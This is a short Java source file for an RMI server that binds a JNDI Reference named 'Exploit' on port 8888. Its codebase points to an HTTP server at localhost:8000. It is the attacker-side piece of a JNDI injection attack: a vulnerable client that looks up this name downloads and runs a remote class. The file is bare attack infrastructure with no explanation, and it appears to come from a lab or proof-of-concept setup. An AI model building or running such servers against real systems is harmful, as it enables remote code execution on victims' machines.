

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.Reference;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RmiServer {

	public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(8888);
        Reference reference = new Reference("Exploit",
                "Exploit","http://localhost:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);
    }
}
